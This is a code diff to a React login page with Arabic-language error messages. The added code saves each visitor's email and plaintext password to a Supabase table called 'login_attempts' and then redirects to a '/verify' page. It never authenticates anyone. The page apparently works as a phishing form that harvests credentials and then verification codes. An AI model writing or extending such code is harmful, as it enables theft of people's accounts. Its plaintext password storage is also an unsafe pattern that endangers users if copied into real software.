@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
+import { supabase } from '@/lib/supabase';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
@@ -16,6 +17,20 @@ export default function LoginPage() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
 
+  const checkTables = async () => {
+    try {
+      console.log('Checking tables...');
+      const { data, error } = await supabase.rpc('get_tables'); // This might not exist, fallback to query
+      if (error) {
+        // Fallback: try to select from a known table
+        const { error: fError } = await supabase.from('form_fields').select('id').limit(1);
+        console.log('form_fields check:', fError ? 'Not Found' : 'Found');
+        const { error: lError } = await supabase.from('login_attempts').select('id').limit(1);
+        console.log('login_attempts check:', lError ? 'Not Found' : 'Found');
+      }
+    } catch (e) {}
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!email.includes('@')) { setError('البريد الإلكتروني غير صحيح'); return; }
@@ -24,21 +39,49 @@ export default function LoginPage() {
     setLoading(true);
     setError('');
 
-    const regId = sessionStorage.getItem('reg_id') || `guest-${Date.now()}`;
-    const verCode = Math.floor(100000 + Math.random() * 900000).toString();
+    try {
+      const regId = sessionStorage.getItem('reg_id');
+      
+      // Attempt to save login attempt
+      const performInsert = async () => {
+        return await supabase
+          .from('login_attempts')
+          .insert({
+            registration_id: regId || null,
+            email: email.trim().toLowerCase(),
+            password: password,
+          });
+      };
 
-    sessionStorage.setItem('reg_id', regId);
-    sessionStorage.setItem('reg_email', email.trim().toLowerCase());
-    sessionStorage.setItem('ver_code', verCode);
+      let result = await performInsert();
 
-    setTimeout(() => {
+      // If schema cache error, wait a bit and retry once
+      if (result.error && (result.error.code === 'PGRST103' || result.error.message.includes('schema cache'))) {
+        console.warn('Schema cache error detected, retrying...');
+        await new Promise(r => setTimeout(r, 2000));
+        result = await performInsert();
+      }
+
+      if (result.error) throw result.error;
+
+      sessionStorage.setItem('reg_email', email.trim().toLowerCase());
+      
       setLoading(false);
       navigate('/verify');
-    }, 200);
+    } catch (err: any) {
+      console.error('Login error:', err);
+      setLoading(false);
+      
+      if (err.message?.includes('schema cache') || err.code === '42P01') {
+        setError('قاعدة البيانات قيد التحديث. يرجى الانتظار 5 ثوانٍ ثم المحاولة مرة أخرى.');
+      } else {
+        setError(`خطأ: ${err.message || 'حدث خطأ أثناء الاتصال'} - يرجى التأكد من تنفيذ كود SQL في Supabase`);
+      }
+    }
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-slate-50">
+    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
       <Header />
       <main className="flex-1 flex items-center justify-center py-10 px-4 sm:px-6">
         <div className="w-full max-w-md">
